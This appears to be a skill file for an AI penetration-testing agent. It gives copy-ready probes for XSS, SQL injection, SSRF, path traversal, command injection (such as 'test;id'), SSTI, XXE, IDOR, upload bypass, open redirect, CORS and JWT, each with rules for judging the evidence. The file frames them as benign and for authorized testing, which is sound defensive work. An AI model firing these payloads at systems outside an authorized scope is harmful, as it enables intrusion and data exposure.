---
name: web-attack-payloads
description: Copy-paste-ready payload playbooks and decision rules for XSS, SQL injection, SSRF, path traversal, command injection, SSTI, XXE, IDOR, file upload bypass, open redirect, CORS, and JWT probes. Use once the vulnerability class is identified (see `web-attack-knowledge` for the class-level methodology) and you need concrete starting payloads.
inject-priority: 3
trigger-keywords:
  - "\\b(xss|ssrf|ssti|idor|csrf|cors|xxe|lfi|rfi)\\b.*\\b(payload|probe|poc|exploit)\\b"
  - "\\b(sql injection|command injection|file inclusion|open redirect|upload bypass)\\b.*\\b(payload|probe|poc)\\b"
  - "payload.*(示例|列表)|测试载荷|注入.*payload"
---

## Concrete Testing Playbooks

Use these as safe starting points for authorized validation. Replace `FUZZ` or parameter values in the scoped target only. Stop once evidence is sufficient. For the class-level methodology (evidence hierarchy, fix guidance, when each class applies), see `web-attack-knowledge`.

### XSS Payload Families

- HTML body context:
  - `<script>window.__xss_fired=1</script>`
  - `<svg/onload="window.__xss_fired='svg'">`
  - `<img src=x onerror="window.__xss_fired='img'">`
- Attribute context:
  - `" autofocus onfocus="window.__xss_fired='focus'`
  - `' onmouseover='window.__xss_fired="hover"`
  - `"><svg/onload="window.__xss_fired='breakout'">`
- JavaScript string context:
  - `';window.__xss_fired='js';//`
  - `";window.__xss_fired='js';//`
  - `` `;window.__xss_fired='tpl';// ``
- URL/link context:
  - `javascript:window.__xss_fired='url'`
  - `data:text/html,<svg onload=window.__xss_fired='data'>`
- Filter/encoding checks:
  - URL encode once: `%3Csvg%2Fonload%3Dwindow.__xss_fired%3D1%3E`
  - HTML entity: `&lt;svg/onload=window.__xss_fired=1&gt;`
  - Case/spacing variants: `<ScRiPt>window.__xss_fired=1</ScRiPt>`
- Decision rule:
  - If payload appears encoded as text, report reflection/escaping behavior, not confirmed XSS.
  - If browser canary/dialog fires, report confirmed XSS with payload, URL, and signal.

### DOM XSS Source-To-Sink Review

- Sources to inspect in page JS:
  - `location.href`, `location.search`, `location.hash`, `document.URL`, `document.referrer`
  - `postMessage`, `localStorage`, `sessionStorage`, cookies, URLSearchParams
- Dangerous sinks:
  - `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`
  - `eval`, `Function`, `setTimeout(string)`, `setInterval(string)`
  - `srcdoc`, dynamic `<script src>`, event-handler attributes
- Workflow:
  - Fetch source, locate source/sink pairs, identify encoding/validation, then use `browser_probe` or XSS scan to confirm execution.
  - For SPA / JS-only challenges (e.g. levels where the vulnerable variable only exists after `DOMContentLoaded`), `fetch_page_source` will return an empty shell. Switch to `browser_probe` to read the rendered HTML and inline scripts, and `browser_evaluate` to inspect runtime state (e.g. `() => xss.get('xss')`, `document.querySelector('#xss').innerHTML`, `JSON.stringify(window.__data__)`).
  - If reproducing the bug needs the user's logged-in account or a tab they already have open, switch to attach mode (see `browser-attach-workflow`): `browser_attach_status` → `browser_list_tabs` → `browser_use_tab` to evaluate the same expression against the live tab without navigation, or `browser_open_tab` for new navigation in a ArgusAI-owned tab.
  - If the level requires Flash / Java applet / Silverlight / other deprecated plugins, mark it as unsolvable on modern browsers and stop — no payload will execute regardless.

### SQL Injection Safe Probes

- Syntax probes:
  - `'`
  - `"`
  - `')`
  - `"))`
- Boolean probes:
  - `' AND '1'='1`
  - `' AND '1'='2`
  - `1 AND 1=1`
  - `1 AND 1=2`
- Comment variants:
  - `'--`
  - `'#`
  - `'/*`
- Column/order checks:
  - `1 ORDER BY 1--`
  - `1 ORDER BY 2--`
  - Increase until error to infer column count.
- Short time probes when authorized:
  - MySQL: `' AND SLEEP(3)--`
  - PostgreSQL: `';SELECT pg_sleep(3)--`
  - SQL Server: `';WAITFOR DELAY '0:0:3'--`
- Decision rule:
  - Error-only evidence is useful but weaker than boolean differential or timing differential.
  - Do not use destructive statements such as `DROP`, `DELETE`, `UPDATE`, or stacked writes.

### SSRF Safe Probes

- Benign external control:
  - `https://example.com/`
  - An authorized collaborator/OOB URL if the user provides one.
- Local/private probes, only when in scope:
  - `http://127.0.0.1/`
  - `http://localhost/`
  - `http://[::1]/`
  - `http://169.254.169.254/` only for authorized cloud metadata testing.
- URL parser tricks to understand validation:
  - `http://allowed.example@127.0.0.1/`
  - `http://127.0.0.1#allowed.example/`
  - `http://allowed.example.evil.test/`
  - Decimal/hex/octal IP forms only when safe and in scope.
- Decision rule:
  - A changed response, timing signal, or server-side callback is stronger than client-side redirect behavior.
  - Report validation bypass only if the server made the request, not merely because a URL was accepted.

### Path Traversal And File Read Probes

- Traversal forms:
  - `../`
  - `../../../../`
  - `..%2f..%2f`
  - `%2e%2e%2f`
  - Double-encoded: `%252e%252e%252f`
- Low-impact target files:
  - Linux: `/etc/hosts`, `/etc/passwd` as proof of read only when authorized.
  - Windows: `C:\Windows\win.ini`
  - App-local: known static file, template, or log path disclosed by errors.
- Null byte check for legacy stacks:
  - `%00` suffix, for example `../../file%00.png`
- Decision rule:
  - Path disclosure alone is not file read. Confirm with recognizable file content or controlled app-local file.

### Command Injection Safe Probes

- Separators to identify shell context:
  - `;`
  - `&&`
  - `|`
  - newline `%0a`
  - backticks or `$()` only if the context suggests a Unix shell.
- Benign commands:
  - Unix: `id`, `whoami`, `uname -a`
  - Windows: `whoami`, `ver`
  - Timing: `sleep 3` or `ping -n 3 127.0.0.1`
- Payload shapes:
  - `test;id`
  - `test&&whoami`
  - `test|whoami`
  - `$(whoami)`
- Decision rule:
  - Prefer output marker or short timing signal. Do not run commands that modify files, users, network settings, or services.

### SSTI Safe Probes

- Engine-neutral arithmetic:
  - `{{7*7}}`
  - `${7*7}`
  - `<%= 7*7 %>`
  - `#{7*7}`
- Fingerprinting:
  - Jinja/Twig-like: `{{7*'7'}}`
  - Freemarker-like: `${7*7}`
  - ERB-like: `<%= 7*7 %>`
- Decision rule:
  - Evaluated arithmetic is strong evidence. Template error messages are useful for fingerprinting but not full confirmation.
  - Do not escalate to file read or command execution unless the user explicitly authorizes that depth.

### XXE Safe Probes

- Parser behavior probe:
  - Add a harmless internal entity and check if it expands in output.
- OOB probe:
  - Use a user-provided collaborator URL for DNS/HTTP callback only when authorized.
- Avoid:
  - Reading sensitive local files or causing entity expansion DoS.
- Decision rule:
  - External callback or controlled entity expansion confirms XXE. Parser errors alone are suspicious, not confirmed.

### IDOR And Access Control Probes

- Compare at least two principals or roles.
- Mutate object identifiers:
  - Numeric IDs: `1001 -> 1002`
  - UUIDs from another user's object
  - Organization/team IDs
  - File/order/invoice IDs
- Test both read and write paths if authorized:
  - GET detail
  - download/export
  - update/delete action
- Decision rule:
  - Predictable IDs are not IDOR by themselves. Unauthorized access or modification is required.

### File Upload Bypass Probes

- Extension variants:
  - `file.php.jpg`
  - `file.jpg.php`
  - `file.phtml`
  - uppercase/lowercase variants
- Content-type mismatch:
  - Image extension with HTML/SVG body
  - SVG with script/event handler for stored XSS validation
- Storage behavior:
  - Check whether file is served from executable origin.
  - Check `Content-Type`, `Content-Disposition`, and path predictability.
- Decision rule:
  - A successful upload is not enough. Impact requires execution, active content rendering, path control, or sensitive processing.

### Open Redirect Probes

- Basic:
  - `https://example.com`
  - `//example.com`
- Parser confusion:
  - `https://trusted.example.evil.test`
  - `https://evil.test@trusted.example`
  - `%2f%2fevil.test`
  - `\evil.test`
- Decision rule:
  - Impact is higher in login, OAuth, SSO, reset-password, and payment flows.

### CORS Probes

- Send attacker-controlled `Origin`.
- Check:
  - `Access-Control-Allow-Origin` reflects arbitrary origin.
  - `Access-Control-Allow-Credentials: true`.
  - Sensitive response body is readable.
- Verify with `cors_exploit_verify`, which runs a real browser `fetch(..., credentials: "include")` from a simulated attacker origin and reports whether JavaScript could read the body.
- Decision rule:
  - ACAO reflection without credentials and without sensitive data is usually lower severity.
  - If `cors_exploit_verify` is not readable, treat it as configuration weakness or non-exploitable by browser CORS, not a confirmed data-leak.

### JWT And Token Probes

- Decode without verifying first:
  - Inspect `alg`, `kid`, `iss`, `aud`, `exp`, `nbf`, `iat`, scopes, and tenant/user IDs.
- Safe checks:
  - Missing expiry.
  - Excessive lifetime.
  - Sensitive data in token body.
  - Weak algorithm choices.
- Avoid forging tokens unless explicitly authorized and keys/algorithm are in scope.
- Decision rule:
  - Decodability is normal for JWT. The issue is weak validation, sensitive content, weak keying, or authorization impact.
